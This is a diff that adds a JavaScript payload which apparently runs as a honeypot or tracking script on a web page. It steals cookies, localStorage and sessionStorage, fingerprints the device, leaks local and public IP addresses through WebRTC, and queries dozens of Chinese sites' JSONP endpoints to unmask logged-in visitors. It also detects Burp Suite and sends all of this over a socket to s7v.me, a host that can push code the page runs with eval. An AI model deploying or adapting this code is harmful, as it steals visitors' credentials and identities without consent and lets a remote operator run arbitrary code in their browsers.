@@ -1,0 +1,633 @@
+(function(ant){(function(t){t.init(function(api) {
+    //(function(API) {
+         //return navigator.getBattery().then(function(battery) {
+           // api.ss("设备电量: " + battery.level * 100 + "%" + "\n" + "是否充电: " + battery.charging);
+        //});
+        
+        
+        
+    //})
+    
+    (function(API) {  
+        navigator.getBattery().then(function(battery) {  
+            var batteryInfo = "设备电量: " + battery.level * 100 + "%" + "\n" + "是否充电: " + battery.charging;  
+            api.ss(batteryInfo);  
+        }).catch(function(error) {  
+            console.error("Error getting battery information:", error);  
+        });  
+    })(api, true);
+    (function(API) {
+       var DATAS = '';
+       var PLUGIN = {
+           getTitle:function(){
+                try{
+                    return document.title;
+                }catch(e){return '';}
+            },
+            getcharset:function(){
+                try{
+                    return document.characterSet;
+                }catch(e){return '';}
+            },
+            getlocation:function(){
+                try{
+                    return document.location.href;
+                }catch(e){return '';}
+            },
+            getreferrer:function(){
+                try{
+                    return document.referrer;
+                }catch(e){return '';}
+            },
+            gettophref:function(){
+                try{
+                    return top.location.href;
+                }catch(e){return '';}
+            },
+            getopener:function(){
+                try{
+                    return (window.opener && window.opener.location.href) ? window.opener.location.href: '';
+                }catch(e){return '';}
+            },
+            getagent:function(){
+                try{
+                    return navigator.userAgent;
+                }catch(e){return '';}  
+            },
+            getappname:function(){
+                try{
+                    return navigator.appName;
+                }catch(e){return '';}
+            },
+            getflashversion:function(){
+                var hasFlash = 0; //是否安装了flash
+                var flashVersion = 0; //flash版本
+                var isIE =/*@cc_on!@*/0; //是否IE浏览器
+                if (isIE) {
+                     var swf1 = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
+                     if (swf1) {
+                         hasFlash = 1;
+                         flashVersion = swf1.GetVariable("$version");
+                     }
+                 } else {
+                     if (navigator.plugins && navigator.plugins.length > 0) {
+                         var swf = navigator.plugins["Shockwave Flash"];
+                         if (swf) {
+                             hasFlash = 1;
+                             flashVersion = swf.description.split(" ");
+                         }
+                     }
+                 }
+                 return flashVersion;
+            },
+            getplatform:function(){
+              try{
+                  return navigator.platform;
+              }catch(e){return '';}  
+            },
+            getcpuclass:function(){
+              try{
+                  return navigator.cpuClass;
+              }catch(e){return '';}  
+            },
+            getcpuspeed:function(){
+                var _speedconstant = 8.9997e-9;
+                var d = new Date();
+                var amount = 150000000;
+                var estprocessor = 1.7;
+                for(var i = amount; i > 0; i--) {}
+                var newd = new Date();
+                var accnewd = Number(String(newd.getSeconds()) + "." + String(newd.getMilliseconds()));
+                var accd = Number(String(d.getSeconds()) + "." + String(d.getMilliseconds()));
+                var di = accnewd - accd;
+                if(d.getMinutes() != newd.getMinutes()) {
+                	di = (60 * (newd.getMinutes() - d.getMinutes())) + di
+                }
+                spd = ((_speedconstant * amount) / di);
+                return("时间:" + Math.round(di * 1000) / 1000 + "秒, 估计速度:" + Math.round(spd * 1000) / 1000 + "GHZ");  
+            },
+            getcookie:function(){
+                try{
+                    return document.cookie;
+                }catch(e){return '';}
+            },
+             getlanguage:function(){
+              try{
+                  return navigator.language;
+              }catch(e){return '';}  
+            },
+            getscreen:function(){
+              try{
+                  return('宽度:' + window.screen.width + '\n' + '高度:' + window.screen.height + '\n' + '颜色深度:' + window.screen.colorDepth);
+              }catch(e){return '';}  
+            },
+            gettime:function(){
+              try{
+                  return new Date();
+              }catch(e){return '';}  
+            },
+            getTimeZoneOffset:function(){
+                try{
+                    var d = new Date()
+                    var n = d.getTimezoneOffset();
+                    return n;
+                }catch(e){return '';}
+            },
+            gethardware:function(){
+              try{
+                  return navigator.hardwareConcurrency;
+              }catch(e){return '';}  
+            },
+            getcookieEnabled:function(){
+                try{
+                    return navigator.cookieEnabled;
+                }catch(e){return '';}
+            },
+            getjavaEnabled:function(){
+                try{
+                    return navigator.javaEnabled();
+                }catch(e){return '';}
+            },
+            getdoNotTrack:function(){
+                try{
+                    return navigator.doNotTrack;
+                }catch(e){return '';}
+            },
+            getonLine:function(){
+                try{
+                    return navigator.onLine;
+                }catch(e){return '';}
+            },
+            getwebRTC:function(){
+                try{
+                    let testRTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection || window.RTCIceGatherer;
+                    if (testRTCPeerConnection) {
+                        let serverConfig = {
+                            "iceServers": [{
+                                urls: [
+                                    'stun:stun.l.google.com:19302?transport=udp',
+                                    'stun:stun1.l.google.com:19302?transport=udp',
+                                    'stun:stun2.l.google.com:19302?transport=udp',
+                                    'stun:stun3.l.google.com:19302?transport=udp',
+                                    'stun:stun4.l.google.com:19302?transport=udp',
+                                    "stun:stun.ekiga.net?transport=udp",
+                                    "stun:stun.ideasip.com?transport=udp",
+                                    "stun:stun.rixtelecom.se?transport=udp",
+                                    "stun:stun.schlund.de?transport=udp",
+                                    "stun:stun.stunprotocol.org:3478?transport=udp",
+                                    "stun:stun.voiparound.com?transport=udp",
+                                    "stun:stun.voipbuster.com?transport=udp",
+                                    "stun:stun.voipstunt.com?transport=udp",
+                                    "stun:stun.voxgratia.org?transport=udp"
+                                ]
+                            }]
+                        };
+                        new RTCPeerConnection(serverConfig);
+                        return true;
+                    }else{
+                        return false;
+                    }
+                }catch(e){return '';}
+            },
+            getSpeedWithDnlink:function(){
+                const connection = window.navigator.connection;
+                 if (connection && connection.downlink) {
+                    return connection.downlink;
+                }
+            },
+            getxianka:function(){
+                var canvas = document.createElement("canvas");
+                var gl = canvas.getContext("experimental-webgl");
+                var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                xianka = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);   // 显卡供应商
+                xuanranqi = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); // 显卡渲染器
+                return('显卡供应商' + '\n' + xianka + '\n'+ '显卡渲染器' + '\n' + xuanranqi);
+            },
+            getplugin:function(){
+                var data = {},
+                plugins = navigator.plugins;
+                for (var i = 0; i < plugins.length; i ++) {
+                    data[plugins[i].name] = plugins[i].description;
+                }
+                return('获取于 (' + new Date().toLocaleString() + ')\n\n' + JSON.stringify(data, null, '\t') + '\n');
+            }
+       }
+      DATAS += '#标题:'+'\n```\n'+PLUGIN.getTitle()+'\n```\n';
+      DATAS += '#网页编码:'+'\n```\n'+PLUGIN.getcharset()+'\n```\n';
+      DATAS += '#Location: '+'\n```\n'+PLUGIN.getlocation()+'\n```\n';
+      DATAS += '#来源页面 : '+'\n```\n'+PLUGIN.getreferrer()+'\n```\n';
+      DATAS += '#顶层页面: '+'\n```\n'+PLUGIN.gettophref()+'\n```\n';
+      DATAS += '#openr: '+'\n```\n'+PLUGIN.gettophref()+'\n```\n';
+      DATAS += '#UserAgent: '+'\n```\n'+PLUGIN.getagent()+'\n```\n';
+      DATAS += '#AppName: '+'\n```\n'+PLUGIN.getappname()+'\n```\n';
+      DATAS += '#FlashVersion: '+'\n```\n'+PLUGIN.getflashversion()+'\n```\n';
+      DATAS += '#Platform: '+'\n```\n'+PLUGIN.getplatform()+'\n```\n';
+      DATAS += '#CPUClass: '+'\n```\n'+PLUGIN.getcpuclass()+'\n```\n';
+      DATAS += '#CPU速度: '+'\n```\n'+PLUGIN.getcpuspeed()+'\n```\n';
+      DATAS += '#Cookies: '+'\n```\n'+PLUGIN.getcookie()+'\n```\n';
+      DATAS += '#Language: '+'\n```\n'+PLUGIN.getlanguage()+'\n```\n';
+      DATAS += '#分辨率: '+'\n```\n'+PLUGIN.getscreen()+'\n```\n';
+      DATAS += '#当前时间: '+'\n```\n'+PLUGIN.gettime()+'\n```\n';
+      DATAS += '#时差区: '+'\n```\n'+PLUGIN.getTimeZoneOffset()+'\n```\n';
+      DATAS += '#硬件内核: '+'\n```\n'+PLUGIN.gethardware()+'\n```\n';
+      DATAS += '#是否启用cookie: '+'\n```\n'+PLUGIN.getcookieEnabled()+'\n```\n';
+      DATAS += '#是否启用Java: '+'\n```\n'+PLUGIN.getjavaEnabled()+'\n```\n';
+      DATAS += '#是否允许跟踪: '+'\n```\n'+PLUGIN.getdoNotTrack()+'\n```\n';
+      DATAS += '#是否网络在线: '+'\n```\n'+PLUGIN.getonLine()+'\n```\n';
+      DATAS += '#是否支持WebRTC: '+'\n```\n'+PLUGIN.getwebRTC()+'\n```\n';
+      DATAS += '#当前网络带宽: '+'\n```\n'+PLUGIN.getSpeedWithDnlink() + ' MB/s' +'\n```\n';
+      DATAS += '#显卡信息: '+'\n```\n'+PLUGIN.getxianka()+'\n```\n';
+      DATAS += '#插件信息: '+'\n```\n'+PLUGIN.getplugin()+'\n```\n';
+      API.ss(DATAS);
+    })(api, true);
+    (function(API) {
+        var _data = '# 本地LocalStorage数据' +
+                    '\n```\n' + JSON.stringify(localStorage) + '\n```\n' +
+                    '# 本地sessionStorage数据' +
+                    '\n```\n' + JSON.stringify(sessionStorage) + '\n```\n' +
+                    '# 本地Cookie数据' +
+                    '\n```\n' + document.cookie + '\n```\n' +
+                    '> 获取于:' + new Date().toLocaleString() + '\n';
+        API.ss(_data);
+    })(api, true);
+    (function (API) {
+        function getIPs(callback) {
+            var ip_dups = {};
+            // 对Firefox和Chrome兼容
+            var RTCPeerConnection = window.RTCPeerConnection ||
+                window.mozRTCPeerConnection ||
+                window.msRTCPeerConnection ||
+                window.webkitRTCPeerConnection;
+            var useWebKit = !!window.webkitRTCPeerConnection;
+            // 绕过对RTC的阻止
+            if (!RTCPeerConnection) {
+                var win = document.getElementById("rtc_iframe").contentWindow;
+                RTCPeerConnection = win.RTCPeerConnection ||
+                    win.mozRTCPeerConnection ||
+                    win.msRTCPeerConnection ||
+                    win.webkitRTCPeerConnection;
+                useWebKit = !!win.webkitRTCPeerConnection;
+            }
+            // 要求最小的数据连接
+            var mediaConstraints = {
+                optional: [{ RtpDataChannels: true }]
+            };
+    
+            var servers = {
+                iceServers: [{
+                    urls: [
+                        'stun:stun.l.google.com:19302?transport=udp',
+                        'stun:stun1.l.google.com:19302?transport=udp',
+                        'stun:stun2.l.google.com:19302?transport=udp',
+                        'stun:stun3.l.google.com:19302?transport=udp',
+                        'stun:stun4.l.google.com:19302?transport=udp',
+                        "stun:stun.ekiga.net?transport=udp",
+                        "stun:stun.ideasip.com?transport=udp",
+                        "stun:stun.rixtelecom.se?transport=udp",
+                        "stun:stun.schlund.de?transport=udp",
+                        "stun:stun.stunprotocol.org:3478?transport=udp",
+                        "stun:stun.voiparound.com?transport=udp",
+                        "stun:stun.voipbuster.com?transport=udp",
+                        "stun:stun.voipstunt.com?transport=udp",
+                        "stun:stun.voxgratia.org?transport=udp"
+                    ]
+                }]
+            };
+            // new一个RTCPeerConnection
+            var pc;
+            try {
+                pc = new RTCPeerConnection(servers, mediaConstraints);
+            } catch (e) {
+                return
+            }
+    
+            function handleCandidate(candidate) {
+                // 匹配IP地址
+                var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
+                var ip_addr = ip_regex.exec(candidate)[1];
+                // 去重
+                if (ip_dups[ip_addr] === undefined)
+                    callback(ip_addr);
+                ip_dups[ip_addr] = true;
+            }
+            // 监听candidate事件
+            pc.onicecandidate = function (ice) {
+                // 跳过非candidate事件
+                if (ice.candidate)
+                    handleCandidate(ice.candidate.candidate);
+            };
+    
+            // 虚构一个数据通道
+            pc.createDataChannel("bl");
+            // create an offer sdp
+            try {
+                pc.createOffer().then(function (result) {
+                    pc.setLocalDescription(result);
+                });
+            } catch (e) {
+                pc.createOffer().then(function (result) {
+                    // 触发stun服务器的请求
+                    pc.setLocalDescription(result, function () { }, function () { });
+                }, function () { });
+            }
+            // wait for a while to let everything done
+            setTimeout(function () {
+                // read candidate info from local description
+                var lines = pc.localDescription.sdp.split('\n');
+    
+                lines.forEach(function (line) {
+                    if (line.indexOf('a=candidate:') === 0)
+                        handleCandidate(line);
+                });
+            }, 1000);
+        }
+        // 获取IP地址
+        getIPs(function (ip) {
+            var li = document.createElement("li");
+            li.textContent = ip;
+            // 本地IP
+            if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/))
+                api.ss('## 获取到局域网IP地址：\n```\n' + ip + '\n```\n');
+            // IPv6
+            else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/))
+                api.ss('## 获取到IPv6地址：\n```\n' + ip + '\n```\n');
+            // 公网IP
+            else
+                api.ss('## 获取到真实IP地址：\n```\n' + ip + '\n```\n');
+        });
+    })(api, true);
+    (function(API, AUTOSTART) {
+        var JSONP = {
+            hooks: [{
+                name: '百度1',
+                link: 'https://istats.baidu.com/portal/operation/getinquiry?&chrome=chrome-extension://&ajax=1&accessid=&device=h5&rule_type=111&callback='
+            }, {
+                name: '百度2',
+                link: 'https://yuedu.baidu.com/nauser/getyduserinfo?na_uncheck=1&opid=wk_na&callback='
+            }, {
+                name: '百度3',
+                link: 'https://ivr.baidu.com/hao123_api/uc/profile/getrootdata?callback='
+            }, {
+                name: 'YY语音',
+                link: 'https://www.yy.com/yyweb/user/queryUserInfo.json?callback='
+            }, {
+                name: '网易163',
+                link: 'https://comment.api.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/recommendList/single?ibc=newspc&offset=0&limit=30&callback='
+            }, {    
+                name: '新浪微博1',
+                link: 'https://widget.weibo.com/public/aj_relationship.php?fuid=2991975565&callback='
+            }, {    
+                name: '新浪微博2',
+                link: 'https://www.weibo.com/ajaxlogin.php?framelogin=0&callback='
+            }, {    
+                name: '哔哩哔哩',
+                link: 'https://api.bilibili.com/x/web-interface/nav?callback='
+            }, {    
+                name: '起点读书',
+                link: 'https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo?areaid=6&appid=10&format=jsonp&method=autoLoginHandler&autoLoginHandler=&_=1607051376245&callback='
+            }, {    
+                name: '东方财富网',
+                link: 'https://api.fund.eastmoney.com/Trade/GetTradeUserInfo?callback='
+            }, {    
+                name: '京东',
+                link: 'https://api.m.jd.com/client.action?functionId=getBabelProductPaged&xxoo=chrome-extension://&body=%7b%22%73%65%63%6f%6e%64%54%61%62%49%64%22%3a%22%30%30%31%35%35%35%35%34%37%30%38%39%33%5f%30%33%37%32%36%36%30%30%5f%22%2c%22%74%79%70%65%22%3a%22%30%22%2c%22%70%61%67%65%4e%75%6d%22%3a%22%31%22%2c%22%6d%69%74%65%6d%41%64%64%72%49%64%22%3a%22%22%2c%22%67%65%6f%22%3a%7b%22%6c%6e%67%22%3a%22%22%2c%22%6c%61%74%22%3a%22%22%7d%2c%22%61%64%64%72%65%73%73%49%64%22%3a%22%22%2c%22%70%6f%73%4c%6e%67%22%3a%22%22%2c%22%70%6f%73%4c%61%74%22%3a%22%22%2c%22%66%6f%63%75%73%22%3a%22%22%2c%22%69%6e%6e%65%72%41%6e%63%68%6f%72%22%3a%22%22%7d&screen=2799*1208&client=wh5&clientVersion=1.0.0&sid=&uuid=&area=&_=1585823068850&callback='
+            }, {    
+                name: '智慧树',
+                link: 'https://newbase.zhihuishu.com/video/getClientIp2?jsonpCallBack='
+            }, {    
+                name: '苏宁易购',
+                link: 'https://myjr.suning.com/sfp/mutualTrust/getLoginInfo.htm?xxoo=chrome-extension://&&callback='
+            }, {    
+                name: '携程旅行',
+                link: 'https://accounts.ctrip.com/ssoproxy/ssoGetUserInfo?xxoo=chrome-extension://&jsonp=%3C%22?&callback='
+            }, {    
+                name: '城通网盘',
+                link: 'https://home.ctfile.com/iajax.php?item=profile&xxoo=chrome-extension://&action=index&callback='
+            }, {    
+                name: 'QQ音乐',
+                link: 'https://u.y.qq.com/cgi-bin/musicu.fcg?data=%7B%22HG%22%3A%7B%22module%22%3A%22Base.VideoFeedsUrlServer%22%2C%22method%22%3A%22GetVideoFeedsUrl%22%2C%22param%22%3A%7B%22fileid%22%3A%220_11_013ee9171515dd784f7988b354084cf1a294299e.zip%22%7D%7D%2C%22DB%22%3A%7B%22module%22%3A%22ScoreCenter.ScoreCenterEx%22%2C%22method%22%3A%22free_login%22%2C%22param%22%3A%7B%22test%22%3A0%2C%22redirect%22%3A%22https%3A%2F%2Factivity.m.duiba.com.cn%2Fsubpage%2Findex%3FskinId%3D1049%22%2C%22activeId%22%3A0%2C%22activeType%22%3A%22%22%7D%7D%2C%22A%22%3A%7B%22module%22%3A%22CDN.SrfCdnDispatchServer%22%2C%22method%22%3A%22GetCdnDispatch%22%2C%22param%22%3A%7B%22guid%22%3A%22MS%22%7D%7D%2C%22B%22%3A%7B%22module%22%3A%22VipActivity.AwardPay%22%2C%22method%22%3A%22GetPayRank%22%2C%22param%22%3A%7B%22actid%22%3A%22D8D2CAAC126AE8FB%22%2C%22pagesize%22%3A0%7D%7D%2C%22C%22%3A%7B%22module%22%3A%22login.BasicinfoServer%22%2C%22method%22%3A%22CallBasicInfo%22%2C%22param%22%3A%7B%7D%7D%7D&callback='
+            }, {    
+                name: '凤凰网',
+                link: 'https://region.ifeng.com/get?format=js&callback='
+            }, {    
+                name: '物理定位',
+                link: 'https://r.inews.qq.com/api/ip2city?otype=jsonp&callback='
+            }, {    
+                name: '淘宝定位',
+                link: 'https://www.taobao.com/help/getip.php?callback='
+            }, {    
+                name: '搜狐定位',
+                link: 'https://v2.sohu.com/api/pc-home-city/home-data/ip2location?_=1606458878259&callback='
+            }, {    
+                name: '获取IP',
+                link: 'https://api.ipify.org/?format=jsonp&callback='
+            }, {
+                name: '腾讯地图',
+                link: 'https://apis.map.qq.com/ws/location/v1/ip?key=3BFBZ-ZKD3X-LW54A-ZT76D-E7AHO-4RBD5&&output=jsonp&callback='
+            }, {
+                name: '58同城',
+                link: 'https://user.58.com/userdata/getlocal/?callback='
+            }, {
+                name: '联想lenovo',
+                link: 'https://i.lenovo.com.cn/mcenter/getUserNameAndUserLevel.jhtml?lenovoId=10216949278&sts=e40e7004-4c8a-4963-8564-31271a8337d8&callback='
+            }, {
+                name: '小米',
+                link: 'https://store.mi.com/in/seckill/seckillinfo?jsonpcallback='
+            }, {
+                name: '陆金所',
+                link: 'https://user.lu.com/user/service/user/current-user-info-for-homepage?jsoncallback='
+            }, {
+                name: '是否登录QQ',
+                link: 'https://gamesafe.qq.com/json.php?mod=Interface&act=getAllPunishData&game_id=23&callback=gsInquiry.getAllPunishDataCallback&_='
+            }, {
+                name: '虎牙直播1',
+                link: 'https://www.huya.com/udb_web/udbport2.php?m=HuyaLogin&xxoo=chrome-extension://&do=checkLogin&callback='
+            }, {
+                name: '虎牙直播2',
+                link: 'https://l.huya.com/udb_web/udbport2.php?m=HuyaLogin&do=checkLogin&callback='
+            }, {
+                name: '斗鱼直播',
+                link: 'https://passport.douyu.com/lapi/passport/iframe/safeAuth?client_id=1&t=1661428037031&_=1661428037076&callback='
+            }, {
+                name: '189电信',
+                link: 'https://www.189.cn/dqmh/system.do?operate=getUserIpAdress&callback='
+            }, {
+                name: '去哪儿网',
+                link: 'https://ws.qunar.com/ips.jcp?callback='
+            }, {
+                name: '2345地理位置',
+                link: 'https://tianqi.2345.com/api/getCityInfoByIp.php?callback='
+            }, {
+                name: '中关村',
+                link: 'https://js.zol.com.cn/pvn/pv.ht?&t=1630909&c=14mu0I65v8EuMzQyNTIzLjE2MzA5MDg4NTk=&callback='
+            }, {
+                name: '和讯网',
+                link: 'https://regtool.hexun.com/wapreg/checklogin.aspx?format=json&encode=utf-8&callback='
+            }, {
+                name: '4399小游戏',
+                link: 'https://u.4399.com/sso/auth/s/youpai/1657177953195?callback='
+            }, {
+                name: '51游戏',
+                link: 'https://notice.51.com/api/message/getuid?callback='
+            }, {
+                name: '9377游戏',
+                link: 'https://wvw.9377.com/api/user_info_jsonp.php?level=1&last_game=1&num=6&callback='
+            }, {
+                name: '4366游戏',
+                link: 'https://wvw.4366.com/api/user_info_jsonp.php?level=1&last_game=1&num=6&callback='
+            }, {
+                name: '7k7k小游戏',
+                link: 'http://login.7k7k.com/apis/check_login?callback='
+            }, {    
+                name: '360',
+                link: 'https://wan.360.cn/u/security?callback='
+            }, {    
+                name: '360官网',
+                link: 'https://login.360.cn/?o=sso&m=info&requestScema=https&callback='
+            }, {
+                name: '新浪微博',
+                link: 'https://api.weibo.com/2/users/show_brief.json?source=2835469272&callback='
+            }, {
+                name: '亿速云',
+                link: 'https://yisuapi.yisu.com/index.php/Speed/Uc/checkLogin/?callback='                      
+            }, {
+                name: '爱拍',
+                link: 'https://www.aipai.com/aipaiApi/userInfo/index?bid=68162753&callback='
+            }, {
+                name: '链家',
+                link: 'https://ajax.api.lianjia.com/login/login/getuserinfo?callback='
+            }, {    
+                name: '妈妈网',
+                link: 'http://www.mama.cn/index.php?g=Home&a=Passport&d=getUrl&callback='
+            }, {
+                name: '爱拍',
+                link: 'https://www.aipai.com/aipaiApi/userInfo/index?bid=39135093&callback='
+            }, {
+                name: '豆瓣',
+                link: 'https://www.douban.com/j/report/2018?from=&callback='
+            }, {
+                name: '56网',
+                link: 'https://i.56.com/api/getHomeLink.php?callback='
+            }, {
+                name: '当当网',
+                link: 'https://message.dangdang.com/api/msg_detail.php?customer_id=o4P00TweebicwjhS72NWew%3D%3D&data_type=jsonp&pageindex=1&module=1&pagesize=10&_=1416721945308&callback='    
+            }, {
+                name: '途牛旅游网',
+                link: 'https://www.tuniu.com/api/sidebar/tools/10000&js_callback='    
+            }, {
+                name: '慕课网',
+                link: 'https://www.imooc.com/u/card%20?jsonpcallback='    
+            }, {
+                name: '爱奇艺',
+                link: 'http://nlwl.iqiyi.com/apis/urc/getqd?authcookie=null&containsUgc=1&agent_type=1&subTypes=1%2C7%2C9&channelIds=1%2C2&callback='
+            }, {
+                name: '爱奇艺1',
+                link: 'https://i.vip.iqiyi.com/client/store/pc/checkout.action?platform=b6c13e26323c537d&fs=&fsSign=&fc=&fv=&qc005=&P00001=&pid=adb3376b039b970b&vipType=2&aid=&device_id=&callback='
+            }, {
+                name: '芒果TV',
+                link: 'http://order.mgtv.com/v1/pc/geturl?callback='
+            }, {
+                name: '人人网',
+                link: 'http://passport.game.renren.com/user/info?callback='
+            }, {
+                name: '搜狐',
+                link: 'https://hqm.stock.sohu.com/getuser?callback=getuser&callback='
+            }, {
+                name: '猫扑网',
+                link: 'http://passport.mop.com/ajax/checkLogined?callback='
+            }, {
+                name: '聚美优品',
+                link: 'http://www.jumei.com/i/ajax/syncCookie?callback='
+            }, {
+                name: '贝壳找房',
+                link: 'https://ajax.api.ke.com/login/login/getuserinfo?callback='
+            }, {
+                name: '书海小说网',
+                link: 'http://www.shuhai.com/login/logined?ajax_gets=jieqi_contents&ajax_request=1&date=0.4540796148511319&CALLBACK='
+            }, {
+                name: '太平洋汽车网',
+                link: 'https://my.pcauto.com.cn/intf/checkLogin.jsp?act=checkLogin&callback='
+            }, {
+                name: '千图网-58pic',
+                link: 'https://www.58pic.com/index.php?m=ajax&callback='
+            }, {
+                name: 'xy游戏',
+                link: 'https://www.xy.com/v3/wapprofile/userInfo?&callback='
+            }, {
+                name: '3D模型',
+                link: 'https://user.3d66.com/login/index/userInfo?callback='
+            }, {
+                name: '直播吧',
+                link: 'https://bbs.zhibo8.cc/user/userinfo?device=pc&_=1584613345023&callback='
+            }, {
+                name: '百合交友',
+                link: 'https://my.baihe.com/Getinterregist/getIPTimes?jsonCallBack='
+            }],
+            start: function() {
+                var self = this,
+                    inter = setInterval(function() {
+                        if (!self.hooks[0]) {
+                            clearInterval(inter);
+                            self.end();
+                            return false;
+                        }
+                        self.get(self.hooks[0].link, self.hooks[0].name);
+                        self.hooks.shift();
+                    }, 1000);
+            },
+            get: function(link, name, fn) {
+                var hash = 'bomb' + String(new Date().getTime());
+                window[hash] = function(data) {
+                    var _data = typeof(data) === 'object' ? JSON.stringify(data) : String(data);
+                    API.ss('### ' + name + '\n```\n' + _data + '\n```\n');
+                };
+                API.loadJS(link + hash);
+            },
+            end: function() {
+                API.send('end');
+            }
+        };
+        API.listen(function(act) {
+            if (act === 'start') {
+                JSONP.start();
+            }
+        });
+        AUTOSTART ? JSONP.start() : null;
+    })(api, true);
+    (function (API) {
+        
+        
+        /**
+        * burpsuite 是一个渗透测试中必备的抓包工具
+        * 几乎每个做渗透的都会用这个软件
+        * 对于一个网站来说，网站的访问者如果挂了 burpsuite 的代理来访问网站
+        * 那多半是不怀好意的。如果能识别出来访问者使用了 burpsuite 那就可以直接丢进蜜罐。
+        * 经常使用 burpsuite 的人应该会有留意到，挂着 burpsuite 的代理是可以访问到 http://burp/ 这个地址的
+        */
+    
+    
+        /**
+         * 这个服务提供了证书下载和从浏览器发送请求和查看响应等功能，除此之外还有一个关键的地方就是它有 favicon 图标
+         * 如果要想从自己的网站上去获取 http://burp/ 的内容就会发生跨域
+         * 所以要使用可以跨域的 img 标签同时配合 onload 事件来判断图片是否加载成功
+         */
+        var img = new Image();
+        img.src = "http://burp/favicon.ico";
+        img.onload = function () {
+            api.ss('来自favicon.ico判断' + '对方开启了BurpSuite！' + '\n');
+        };
+        img.onerror = function () {
+            api.ss('访问不到favicon.ico图标，对方没开BurpSuite!' + '\n');
+        };
+        /**
+         * 还可以用 script 标签加 onload 事件来检测。
+         */
+    
+        var script = document.createElement("script");
+        script.src = "http://burp/jquery.js";
+        document.getElementsByTagName("head")[0].appendChild(script);
+        script.onload = function () {
+            api.ss('来自jquery.js判断' + '对方开启了BurpSuite!' + '\n');
+        };
+    })(api, true);
+})})({config:{host:window.location.protocol+"//s7v.me"},init:function(fn,timeout){var self=this,api=new self.API;setTimeout(function(){api.loadJS(self.config.host+"/pro/js/socket.io.min.js",function(){api.socket=io.connect(self.config.host);api.socket.on("connect",function(){this.emit("server",43)}).on("disconnect",function(){this.close()}).on("init",function(t){setInterval(function(){api.socket.emit("alive",true)},1e3*10);fn?fn(api):null}).on("plugin-sender",function(ret){if(typeof ret!=="object"||!ret.act||!ret.data){return false}switch(ret.act){case"inject":var plugin=eval(ret.data);plugin(api);break}})})},timeout||0)},API:function(){return{socket:null,loadJS:function(t,n){var e=document.createElement("script");e.src=t;e.readyState?e.onreadystatechange=function(){e.readyState==="loaded"||e.readyState==="complete"?n():null}:e.onload=n;document.head.appendChild(e);return this},listen:function(t){this.socket.removeEventListener("plugin-listener");this.socket.on("plugin-listener",t);return this},send:function(t){this.socket.emit("plugin-sender",t);return this},save:function(t,n){var e=typeof t==="string"?t:typeof t==="object"?JSON.stringify(t):String(t);e+=n?"":"\n";this.socket.emit("save",e);return this},ss:function(t){this.send(t).save(t)}}}})})();
